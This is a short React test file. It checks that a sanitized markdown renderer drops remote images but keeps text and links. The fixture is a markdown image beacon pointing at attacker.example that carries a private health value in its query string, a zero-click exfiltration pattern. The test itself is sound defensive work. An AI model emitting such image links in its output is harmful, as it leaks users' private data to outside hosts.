import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import { NO_REMOTE_IMAGES } from './safeMarkdown';

describe('NO_REMOTE_IMAGES', () => {
  it('drops markdown images (no zero-click beacon) but keeps text and links', () => {
    const md = 'Your ferritin is low.\n\n![x](https://attacker.example/p.png?d=ferritin-8) [source](https://pubmed.ncbi.nlm.nih.gov/1/)';
    const { container } = render(
      <ReactMarkdown rehypePlugins={[rehypeSanitize]} disallowedElements={NO_REMOTE_IMAGES}>{md}</ReactMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Your ferritin is low.');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://pubmed.ncbi.nlm.nih.gov/1/');
  });
});
